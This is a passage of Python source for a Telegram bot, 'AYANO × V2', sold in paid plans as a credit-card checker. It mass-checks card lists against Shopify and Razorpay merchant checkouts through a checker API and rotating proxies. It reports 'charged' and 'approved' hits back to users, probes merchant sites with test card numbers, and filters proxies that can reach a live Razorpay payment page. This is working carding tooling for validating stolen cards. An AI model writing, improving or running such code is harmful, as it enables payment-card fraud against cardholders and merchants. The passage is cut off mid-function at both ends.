        f"🔥 <b>Approved</b> » {len(results['approved'])}\n"
        f"❌ <b>Declined</b> » {len(results['dead'])}\n"
        f"📊 <b>Progress</b> » {checked}/{total}\n"
        f"▓ {bar}\n"
        f"⏱️ <b>Elapsed</b>  » {elapsed_str} | <b>ETA</b> {eta_str}\n"
        f"🚀 <b>Speed</b>    » {speed}\n\n"
        f"⚡ Powered by @AYANOOXD"
    )

    buttons = [
        [Button.inline("STOP", f"stop_{user_id}".encode(), style="danger")]
    ]

    await safe_bot_edit(chat_id, message_id, progress_text, buttons=buttons, parse_mode='html')


async def send_final_results(chat_id, results):
    """UI UPGRADE — polished final results message with hits list."""
    charged_count = len(results['charged'])
    approved_count = len(results['approved'])
    dead_count = len(results['dead'])
    total = results.get('total', charged_count + approved_count + dead_count)

    hits_lines = []
    for r in results['charged'][:5]:
        hits_lines.append(f"💎 <code>{r['card']}</code>  {r.get('gateway','?')}  {r.get('price','-')}")
    for r in results['approved'][:5]:
        hits_lines.append(f"✅ <code>{r['card']}</code>  {r.get('gateway','?')}  {r.get('price','-')}")

    hits_text = "\n".join(hits_lines) if hits_lines else "  No hits this run."

    elapsed = time.time() - results.get('start_time', time.time())
    elapsed_str = f"{int(elapsed//60)}m {int(elapsed%60)}s"
    speed = f"{total/max(elapsed,1):.1f} cards/s" if elapsed > 0 else "-"

    summary = (
        f"<b>✅ CHECK COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>RESULTS</b>\n"
        f"   💎 Charged  : {charged_count}\n"
        f"   ✅ Approved : {approved_count}\n"
        f"   ❌ Declined : {dead_count}\n"
        f"   📦 Total    : {total}\n"
        f"   ⏱️ Time     : {elapsed_str} ({speed})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 <b>HITS</b>\n"
        f"{hits_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Made by @AYANOOXD"
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    # FIX #5: Write temp files to /tmp (always writable) instead of BASE_DIR (may be read-only in Docker/Railway)
    filename = os.path.join('/tmp', f"ayano{timestamp}.txt")

    # BUG FIX: always clean up temp file, even if send fails
    try:
        async with aiofiles.open(filename, 'w') as f:
            await f.write("CC CHECKER RESULTS\n")
            await f.write("=" * 40 + "\n\n")

            await f.write(f"CHARGED ({charged_count}):\n")
            for r in results['charged']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {_display_message(r['message'])[:100]}\n")
            await f.write("\n")

            await f.write(f"APPROVED ({approved_count}):\n")
            for r in results['approved']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {_display_message(r['message'])[:100]}\n")
            await f.write("\n")

            await f.write(f"DECLINED ({dead_count}):\n")
            for r in results['dead']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {_display_message(r['message'])[:100]}\n")

        try:
            await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode='html')
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
            try:
                await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode='html')
            except Exception as e2:
                print(f"[send_final_results] retry failed: {e2}")
                # Fallback: send summary text so results aren't lost even if file send fails
                await bot.send_message(chat_id, premium_emoji(summary), parse_mode='html')
    except Exception as send_err:
        print(f"[send_final_results] Error: {send_err}")
        try:
            await bot.send_message(chat_id, premium_emoji(summary), parse_mode='html')
        except Exception:
            pass
    finally:
        # Always remove temp file — prevents disk leak on FloodWait or exception
        try:
            os.remove(filename)
        except OSError:
            pass


# ─── SITE / PROXY TESTING ───────────────────────────────────────────────────

async def test_site(site, proxy, need_price=False):
    """
    Site alive/dead check.
    - need_price=False → uses fast /test_site endpoint (no price returned)
    - need_price=True  → uses /check endpoint with test card (returns price)
    """
    try:
        clean_site = site.replace('https://', '').replace('http://', '').split('/')[0]
        proxy_str = proxy_to_api_param(proxy) if proxy else None

        if need_price:
            # Use /check endpoint to get price info
            test_card = "4031630422575208|01|2030|280"
            url = f'{CHECKER_API_URL}?cc={quote(test_card, safe="|:")}&site={quote(clean_site, safe="://?=&@")}'
            if proxy_str:
                url += f'&proxy={quote(proxy_str, safe=":@")}'

            timeout = aiohttp.ClientTimeout(total=30)  # max 30s dead-site timeout
            _session = _shared_http_session()
            async with _session.get(url, timeout=timeout) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': '-'}
                try:
                    raw = await resp.json()
                except Exception:
                    return {'site': site, 'status': 'dead', 'price': '-'}

            # Handle API error responses
            if 'error' in raw and 'status' not in raw:
                return {'site': site, 'status': 'dead', 'price': '-'}

            # ── Capitalized API keys: Status, Response, Price ──
            _raw_st_t    = str(raw.get('Status',   raw.get('status',  ''))).strip()
            response_msg = raw.get('Response',  raw.get('message', ''))
            raw_price    = raw.get('Price',     raw.get('price',   '-'))
            _rmsg_t      = str(response_msg).strip().upper()

            if _is_dead_keyword(response_msg):
                return {'site': site, 'status': 'dead', 'price': '-'}

            # Site alive: Status="true" OR Response is a card-level decline
            _is_alive = (
                _raw_st_t.lower() == 'true' or
                _rmsg_t in _SITE_ALIVE_RESPONSES or
                any(kw in _rmsg_t for kw in (
                    'DECLINED', 'DO_NOT_HONOR', 'INSUFFICIENT', 'FRAUD',
                    '3DS', 'OTP', 'EXPIR', 'HONOR', 'BLOCKED',
                    'CALL_ISSUER', 'TRY_AGAIN', 'PROCESSING_ERROR',
                    'ORDER_PLACED', 'CHARGED', 'ORDER_PAID',
                ))
            )
            if _is_alive:
                return {'site': site, 'status': 'alive', 'price': raw_price}
            else:
                return {'site': site, 'status': 'dead', 'price': '-'}
        else:
            # Use fast /test_site endpoint (no price)
            url = f'{SITE_TEST_URL}?cc=4111111111111111|12|2030|123&site={quote(clean_site, safe="://?=&@")}'
            if proxy_str:
                url += f'&proxy={quote(proxy_str, safe=":@")}'

            timeout = aiohttp.ClientTimeout(total=30)  # max 30s dead-site timeout
            _session = _shared_http_session()
            async with _session.get(url, timeout=timeout) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': '-'}
                try:
                    raw = await resp.json()
                except Exception:
                    return {'site': site, 'status': 'dead', 'price': '-'}

            # ── Capitalized API keys: Status, Response ──
            _raw_st_f    = str(raw.get('Status',   raw.get('status',  ''))).strip()
            response_msg = raw.get('Response',  raw.get('message', ''))
            _rmsg_f      = str(response_msg).strip().upper()

            if _is_dead_keyword(response_msg):
                return {'site': site, 'status': 'dead', 'price': '-'}

            # Site alive: Status="true" OR Response is a card-level decline
            _is_alive_f = (
                _raw_st_f.lower() == 'true' or
                _rmsg_f in _SITE_ALIVE_RESPONSES or
                any(kw in _rmsg_f for kw in (
                    'DECLINED', 'DO_NOT_HONOR', 'INSUFFICIENT', 'FRAUD',
                    '3DS', 'OTP', 'EXPIR', 'HONOR', 'BLOCKED',
                    'CALL_ISSUER', 'TRY_AGAIN', 'PROCESSING_ERROR',
                    'ORDER_PLACED', 'CHARGED', 'ORDER_PAID',
                ))
            )
            if _is_alive_f:
                return {'site': site, 'status': 'alive', 'price': '-'}
            else:
                return {'site': site, 'status': 'dead', 'price': '-'}

    except Exception:
        return {'site': site, 'status': 'dead', 'price': '-'}

async def test_proxy(proxy):
    try:
        proxy_url = build_proxy_url(proxy)
        if not proxy_url:
            return {'proxy': proxy, 'status': 'dead'}

        timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=8)

        # Use a fresh connector per proxy — shared session ignores proxy= on pooled conns
        connector = aiohttp.TCPConnector(limit=1, force_close=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            test_urls = [
                'http://httpbin.org/ip',        # plain HTTP — fastest, no TLS overhead
                'http://www.google.com/generate_204',  # fallback
            ]
            last_error = None
            for test_url in test_urls:
                try:
                    async with session.get(
                        test_url, proxy=proxy_url,
                        timeout=timeout, allow_redirects=False
                    ) as res:
                        if res.status in (200, 204, 301, 302):
                            return {'proxy': proxy, 'status': 'alive'}
                        last_error = f'HTTP {res.status}'
                except Exception as e:
                    last_error = str(e)
                    continue

        return {'proxy': proxy, 'status': 'dead', 'error': last_error or 'failed'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead', 'error': str(e)}


async def test_proxy_razorpay(proxy):
    """
    Validates a proxy against https://razorpay.me/@innatemind

    Page is SSR (Server-Side Rendered) — full merchant JSON is embedded
    in the HTML inside: <script>var data = {...};</script>

    WORKING = proxy can fetch the page AND the embedded JSON proves:
      1. HTTP 200
      2. var data = {...} JSON block present in HTML
      3. data["environment"] == "production"
      4. data["is_test_mode"] == False
      5. data["key_id"] starts with "rzp_live_"
      6. data["payment_link"]["status"] == "active"
      7. data["keyless_header"] starts with "api_v1:"
         (this is freshly generated per-request — proves real load, not cached)

    DEAD = anything else (conn fail, timeout, HTTP error, blocked/filtered page,
           JSON missing, any condition above fails)
    """
    import ssl as _ssl, json as _json, re as _re
    RAZORPAY_TEST_URL = 'https://razorpay.me/@innatemind'
    try:
        proxy_url = build_proxy_url(proxy)
        if not proxy_url:
            return {'proxy': proxy, 'status': 'dead', 'error': 'invalid proxy format'}

        # ssl_ctx: disable cert verification (required for many proxy tunnels)
        # NOTE: pass ssl= to session.get(), NOT to TCPConnector
        # TCPConnector ssl= controls the proxy connection, not the target HTTPS tunnel
        ssl_ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = _ssl.CERT_NONE

        timeout = aiohttp.ClientTimeout(total=18, connect=7, sock_connect=7, sock_read=14)
        connector = aiohttp.TCPConnector(limit=1, force_close=True)

        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                async with session.get(
                    RAZORPAY_TEST_URL,
                    proxy=proxy_url,
                    ssl=ssl_ctx,
                    timeout=timeout,
                    allow_redirects=True,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                                      'Chrome/124.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Cache-Control': 'no-cache',
                    }
                ) as res:
                    # Step 1: Must be HTTP 200
                    if res.status != 200:
                        return {'proxy': proxy, 'status': 'dead', 'error': f'HTTP {res.status}'}

                    body = await res.text(encoding='utf-8', errors='ignore')

                    # Step 2: Extract the inline JSON block — var data = {...};
                    m = _re.search(r'var\s+data\s*=\s*(\{.*?\});', body, _re.DOTALL)
                    if not m:
                        return {'proxy': proxy, 'status': 'dead', 'error': 'no data JSON in page (blocked/filtered)'}

                    try:
                        data = _json.loads(m.group(1))
                    except _json.JSONDecodeError:
                        return {'proxy': proxy, 'status': 'dead', 'error': 'JSON parse failed (truncated response)'}

                    # Step 3: Validate every field
                    key_id         = data.get('key_id', '')
                    is_test_mode   = data.get('is_test_mode', True)
                    environment    = data.get('environment', '')
                    keyless_header = data.get('keyless_header', '')
                    pl             = data.get('payment_link') or {}
                    pl_status      = pl.get('status', '')

                    if not key_id.startswith('rzp_live_'):
                        return {'proxy': proxy, 'status': 'dead', 'error': f'not live key: {key_id[:20]}'}
                    if is_test_mode:
                        return {'proxy': proxy, 'status': 'dead', 'error': 'test mode active'}
                    if environment != 'production':
                        return {'proxy': proxy, 'status': 'dead', 'error': f'env={environment}'}
                    if pl_status != 'active':
                        return {'proxy': proxy, 'status': 'dead', 'error': f'payment_link status={pl_status}'}
                    if not keyless_header.startswith('api_v1:'):
                        return {'proxy': proxy, 'status': 'dead', 'error': 'invalid keyless_header (stale/cached page)'}

                    # All checks passed — proxy works on Razorpay
                    return {'proxy': proxy, 'status': 'alive'}

            except aiohttp.ClientProxyConnectionError as e:
                return {'proxy': proxy, 'status': 'dead', 'error': f'proxy conn failed: {str(e)[:60]}'}
            except aiohttp.ClientConnectorError as e:
                return {'proxy': proxy, 'status': 'dead', 'error': f'connect error: {str(e)[:60]}'}
            except aiohttp.ServerDisconnectedError:
                return {'proxy': proxy, 'status': 'dead', 'error': 'server disconnected'}
            except asyncio.TimeoutError:
                return {'proxy': proxy, 'status': 'dead', 'error': 'timeout'}
            except Exception as e:
                return {'proxy': proxy, 'status': 'dead', 'error': str(e)[:80]}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead', 'error': str(e)[:80]}

# ─── BOT HANDLERS ───────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/start(?:\s|$)'))
async def start(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    # Channel verification check (only once)
    if not is_user_verified(user_id) and user_id not in ADMIN_ID:
        join_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome to AYANO × V2</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔒 <b>Access Restricted</b>\n\n"
            f"Please join all the following channels to continue:\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        buttons = [
            [
                Button.url("LOGS", LOGS_CHANNEL, style="success"),
                Button.url("CHECKING", CHECKING_CHANNEL, style="success"),
            ],
            [
                Button.url("UPDATES", UPDATES_CHANNEL, style="success"),
            ],
            [
                Button.inline("JOINED", b"verify_joined", style="success"),
            ]
        ]

        await event.reply(premium_emoji(join_text), buttons=buttons, parse_mode='html')
        return

    # Normal flow if verified
    assign_free_plan(user_id)

    users_data = load_users_data()
    uid = str(user_id)
    user_data = users_data.get(uid)
    is_free_user = (user_data and user_data.get('plan') == 'FREE') and user_id not in ADMIN_ID

    if is_free_user:
        _free_session_limit = user_data.get('cc_limit', PLANS['FREE']['cc_limit'])
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🆓 <b>Free Plan Activated</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Session Limit  » <b>{_free_session_limit} CC / session</b>\n"
            f"🏠 Access        » <b>Group Only</b>\n\n"
            f"👇 <b>Join Group to Start:</b>\n"
            f"   {GROUP_LINK}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Upgrade via /plan for more power\n"
            f"💡 Made by <b>@AYANOOXD</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=True)
    else:
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 <b>Shopify CC Checker</b>\n"
            f"  Fast  ·  Accurate  ·  Premium\n\n"
            f"📌 <b>Quick Start:</b>\n"
            f"  💳 <code>/cc 4111...|12|26|123</code>\n"
            f"  📂 <code>/chk</code>  — reply to .txt for mass check\n"
            f"  🔌 <code>/addproxy</code>  — add your proxies\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Made by <b>@AYANOOXD</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=False)

    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')


# ================== JOINED BUTTON CALLBACK ==================
@bot.on(events.CallbackQuery(data=b"verify_joined"))
async def verify_joined_callback(event):
    user_id = event.sender_id

    if is_user_verified(user_id):
        await event.answer("✅ You are already verified!", alert=True)
        return

    channels = [
        ("LOGS", LOGS_CHANNEL),
        ("CHECKING", CHECKING_CHANNEL),
        ("UPDATES", UPDATES_CHANNEL),
    ]

    not_joined = []

    for name, link in channels:
        try:
            entity = await bot.get_entity(link)
            await bot(GetParticipantRequest(entity, user_id))
            # Success → user is member
        except UserNotParticipantError:
            not_joined.append(name)
        except Exception as e:
            print(f"[Channel Verification] {name} failed: {str(e)[:100]}")
            not_joined.append(name)

    if not_joined:
        await event.answer(
            f"❌ Please join all channels first!\nMissing: {', '.join(not_joined)}",
            alert=True
        )
        return

    # User has joined all channels
    mark_user_verified(user_id)
    await event.answer("✅ Verification successful! Welcome.", alert=True)

    # Delete the verification message
    try:
        await event.delete()
    except Exception:
        pass

    # Send normal welcome message
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    assign_free_plan(user_id)

    # ================== VERIFICATION SUCCESS ANIMATION ==================
    # Step 1
    msg = await event.respond(premium_emoji(
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔄 <b>Verifying your access...</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    ), parse_mode='html')

    await asyncio.sleep(0.9)

    # Step 2 - Replace text
    try:
        await msg.edit(premium_emoji(
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ <b>Access Verified!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode='html')
    except Exception:
        pass

    await asyncio.sleep(0.8)

    # Step 3 - Final beautiful message (replace again)
    final_text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Verification Successful</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎉 Welcome to AYANO × V2\n\n"
        f"⚡ Your access has been unlocked!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Made by <b>@AYANOOXD</b>"
    )

    buttons = get_main_menu_keyboard(user_id, is_free=False)

    try:
        await msg.edit(premium_emoji(final_text), buttons=buttons, parse_mode='html')
    except Exception:
        await event.respond(premium_emoji(final_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"stop_proxy_check"))
async def stop_proxy_check_callback(event):
    # Security: only the owner who triggered the proxy check can stop it
    owner = current_proxy_check.get('owner_id')
    if owner is not None and event.sender_id != owner and event.sender_id not in ADMIN_ID:
        await event.answer("❌ This is not your proxy check session.", alert=True)
        return

    tasks = current_proxy_check.get('tasks', [])
    if tasks:
        current_proxy_check['stopped'] = True
        cancelled = 0
        for t in tasks:
            if not t.done():
                t.cancel()
                cancelled += 1

        alive = current_proxy_check.get('alive_proxies', [])
        dead = current_proxy_check.get('dead_proxies', [])
        mode = current_proxy_check.get('mode', 'add')
        all_proxies = current_proxy_check.get('new_proxies', [])
        unchecked = []

        try:
            if mode == 'check':
                # /proxy mode: save alive + unchecked, remove dead
                checked_set = set(alive) | set(dead)
                unchecked = [p for p in all_proxies if p not in checked_set]
                to_save = alive + unchecked
                async with aiofiles.open(PROXY_FILE, 'w') as f:
                    for proxy in to_save:
                        await f.write(f"{proxy}\n")
            elif alive:
                # /addproxy mode: append new alive proxies
                async with aiofiles.open(PROXY_FILE, 'a') as f:
                    for proxy in alive:
                        await f.write(f"{proxy}\n")
        except Exception:
            pass

        saved_label = f"Saved {len(alive)} alive proxies" if mode == 'add' else f"Kept {len(alive)} alive + {len(unchecked)} unchecked"
        await event.answer(f"⛔ Stopped! {saved_label}.", alert=True)
        try:
            await event.edit(premium_emoji(
                f"🛑 <b>Proxy Check Stopped</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Saved (Working)</b>  » <b>{len(alive)}</b>\n"
                f"❌ <b>Dead (Removed)</b>   » <b>{len(dead)}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💾 DB updated."
            ), parse_mode='html')
        except Exception:
            pass
    else:
        await event.answer("No active proxy check running.", alert=True)



@bot.on(events.CallbackQuery(data=b"stop_rzpxy_check"))
async def stop_rzpxy_check_callback(event):
    """STOP button for /rzpxy — Razorpay proxy checker."""
    owner = current_rzpxy_check.get('owner_id')
    if owner is not None and event.sender_id != owner and event.sender_id not in ADMIN_ID:
        await event.answer("❌ This is not your /rzpxy session.", alert=True)
        return

    tasks = current_rzpxy_check.get('tasks', [])
    if tasks:
        current_rzpxy_check['stopped'] = True
        for t in tasks:
            if not t.done():
                t.cancel()

        alive = current_rzpxy_check.get('alive_proxies', [])
        dead  = current_rzpxy_check.get('dead_proxies', [])
        await event.answer(f"⛔ Stopped! {len(alive)} working proxies found.", alert=True)
        try:
            await event.edit(premium_emoji(
                f"🛑 <b>RZPXY Check Stopped</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Working (RazorPay)</b> » <b>{len(alive)}</b>\n"
                f"❌ <b>Dead / Failed</b>      » <b>{len(dead)}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💾 Partial results saved."
            ), parse_mode='html')
        except Exception:
            pass

        # Send partial results files (same as normal completion)
        chat_id = event.chat_id
        owner_id = current_rzpxy_check.get('owner_id', 0)
        if alive:
            try:
                tmp_alive = os.path.join('/tmp', f'rzpxy_working_{owner_id}.txt')  # FIX #5: /tmp not BASE_DIR
                async with aiofiles.open(tmp_alive, 'w') as _f:
                    await _f.write("\n".join(alive))
                await bot.send_file(
                    chat_id, tmp_alive,
                    caption=premium_emoji(
                        f"✅ <b>RZPXY — Working Proxies (Partial)</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ Total » <b>{len(alive)}</b> working proxies"
                    ),
                    parse_mode='html',
                    attributes=[telethon.tl.types.DocumentAttributeFilename('rzpxy_working.txt')]
                )
                try:
                    os.remove(tmp_alive)
                except Exception:
                    pass
            except Exception:
                pass
    else:
        await event.answer("No active /rzpxy check running.", alert=True)

@bot.on(events.CallbackQuery(data=b"stop_addsites"))
async def stop_addsites_callback(event):
    """STOP button for /addsites checking — cancels the active admin session."""
    owner = current_addsites_check.get('owner_id')
    if event.sender_id not in ADMIN_ID:
        await event.answer("❌ Admin only.", alert=True)
        return
    if owner is not None and event.sender_id != owner:
        await event.answer("❌ This is not your addsites session.", alert=True)
        return

    tasks = current_addsites_check.get('tasks', [])
    if tasks:
        current_addsites_check['stopped'] = True
        for task in tasks:
            if not task.done():
                task.cancel()
        await event.answer("⛔ Stopping... saving found sites.", alert=True)
    else:
        await event.answer("No active addsites check running.", alert=True)


@bot.on(events.CallbackQuery(data=b"stop_site_check"))
async def stop_site_check_callback(event):
    owner = current_site_check.get('owner_id')
    if owner is not None and event.sender_id != owner and event.sender_id not in ADMIN_ID:
        await event.answer("❌ This is not your site check session.", alert=True)
        return

    tasks = current_site_check.get('tasks', [])
    if tasks:
        current_site_check['stopped'] = True
        for task in tasks:
            if not task.done():
                task.cancel()
        await event.answer("⛔ Site checking stopped.", alert=True)
    else:
        await event.answer("No active site check running.", alert=True)


@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = (
        "📋 <b>Commands</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🛒 <b>Shopify Gate</b>\n"
        "  <code>/cc 4111|12|26|123</code>  — single card\n"
        "  <code>/chk</code>  — reply to .txt → mass check\n\n"
        "💳 <b>Razorpay Gate</b>  <i>(🥇 PREMIUM / 👑 VIP only)</i>\n"
        "  <code>/rz 4111|12|26|123</code>  — single card\n"
        "  <code>/mrz</code>  — reply to .txt → mass check\n\n"
        "💎 <b>Plans & Access</b>\n"
        "  <code>/plan</code>    — view available plans\n"
        "  <code>/redeem CODE</code> — activate a code\n"
        "  <code>/myplan</code>  — check your plan status\n\n"
        "🌐 <b>Site Management</b>\n"
        "  <code>/site</code>  — remove dead sites\n"
        "  <code>/rm site.com</code>  — remove one site\n\n"
        "🔌 <b>Proxy Management</b>\n"
        "  <code>/addproxy ip:port:u:p</code>  — add proxy\n"
        "  <code>/proxy</code>  — clean dead proxies\n"
        "  <code>/rzpxy</code>  — check proxies on Razorpay\n"
        "  <code>/getproxy</code>  — view all proxies\n"
        "  <code>/chkproxy ip:port</code>  — test one proxy\n"
        "  <code>/rmproxy ip:port</code>  — remove one proxy\n"
        "  <code>/rmproxyindex 1,3,5</code>  — remove by #\n"
        "  <code>/clearproxy</code>  — wipe all (saves backup)\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    buttons = [[Button.inline("Back", b"main_menu", style="danger")]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return

    admin_text = (
        "👑 <b>Admin Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎟️ <b>Generate Code</b> — Select plan below\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 <b>User Management</b>\n"
        "  <code>/ban ID [reason]</code>   — ban a user\n"
        "  <code>/unban ID</code>          — unban a user\n"
        "  <code>/banlist</code>           — view all banned users\n"
        "  <code>/removeplan ID</code>     — remove plan → reset to FREE\n"
        "  <code>/userinfo ID</code>       — full user details\n"
        "  <code>/listusers</code>         — all users & plans\n\n"
        "🎟️ <b>Codes</b>\n"
        "  <code>/getcodes</code>          — all unused codes\n"
        "  <code>/getcodes PLAN</code>     — filter by plan (eg. VIP)\n"
        "  <code>/listcodes</code>         — used + unused summary\n\n"
        "🌐 <b>Sites</b>\n"
        "  <code>/addsites</code>          — reply to .txt to add sites\n"
        "  <code>/getsites</code>          — download sites.txt\n\n"
        "📊 <b>Other</b>\n"
        "  <code>/stats</code>             — bot statistics\n"
        "  <code>/broadcast MSG</code>     — message all users"
    )

    buttons = [
        [
            Button.inline("FREE",     b"gencode_FREE", style="success"),
            Button.inline("BASIC",    b"gencode_BASIC", style="success"),
        ],
        [
            Button.inline("STANDARD", b"gencode_STANDARD", style="success"),
            Button.inline("PREMIUM",  b"gencode_PREMIUM", style="success"),
        ],
        [
            Button.inline("VIP",      b"gencode_VIP", style="success"),
        ],
        [Button.inline("Back", b"main_menu", style="danger")],
    ]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    users_data = load_users_data()
    uid = str(user_id)
    user_data_m = users_data.get(uid)
    is_free_user_m = (user_data_m and user_data_m.get('plan') == 'FREE') and user_id not in ADMIN_ID

    if is_free_user_m:
        _free_session_limit_m = user_data_m.get('cc_limit', PLANS['FREE']['cc_limit'])
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🆓 <b>Free Plan Active</b>\n"
            f"  ⚡ {_free_session_limit_m} CC checks per session\n"
            f"  🏠 Group-only checking\n\n"
            f"👇 <b>Join our group:</b>\n"
            f"  {GROUP_LINK}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Upgrade via /plan\n"
            f"💡 Made by <b>@AYANOOXD</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=True)
    else:
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 <b>Shopify CC Checker</b>\n"
            f"  Fast  ·  Accurate  ·  Premium\n\n"
            f"📌 <b>Quick Start:</b>\n"
            f"  💳 <code>/cc 4111...|12|26|123</code>\n"
            f"  📂 <code>/chk</code>  — reply to .txt for mass check\n"
            f"  🔌 <code>/addproxy</code>  — add your proxies\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Made by <b>@AYANOOXD</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=False)

    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    check_status = can_check(user_id, event.is_private)
    if check_status == 'banned':
        await event.reply(premium_emoji(
            "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🚫  You have been banned from using this bot.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡  Contact @AYANOOXD if this is a mistake"
        ), parse_mode='html')
        return
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "𝗡𝗢 𝗣𝗟𝗔𝗡 𝗙𝗢𝗨𝗡𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "❌  You need a plan to check cards.\n"
            "📌  Use /plan to see available plans\n"
            "📌  Use /redeem CODE to activate"
        ), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji(
            "𝗣𝗟𝗔𝗡 𝗘𝗫𝗣𝗜𝗥𝗘𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⏰  Your plan has expired.\n"
            "📌  Use /plan to purchase a new plan\n"
            "📌  Or /redeem CODE to reactivate"
        ), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            "𝗚𝗥𝗢𝗨𝗣 𝗢𝗡𝗟𝗬\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🆓  Free Plan — Group checking only.\n"
            f"👇  Join group to check:\n"
            f"    {GROUP_LINK}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡  Upgrade: /plan"
